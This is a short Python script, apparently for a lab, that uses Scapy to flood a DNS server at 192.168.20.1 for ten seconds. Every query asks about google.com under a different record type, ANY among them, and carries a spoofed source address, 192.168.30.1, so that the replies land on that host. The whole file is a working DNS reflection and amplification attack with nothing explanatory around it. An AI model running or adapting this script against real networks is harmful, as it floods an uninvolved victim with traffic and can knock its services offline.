from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
C= RandShort()
D= 53
query_name = "google.com"
query_type = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"]

start = time.time()
while (time.time() - start < 10):
    for i in range(0,len(query_type)):
        spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
        send(spoofed_packet)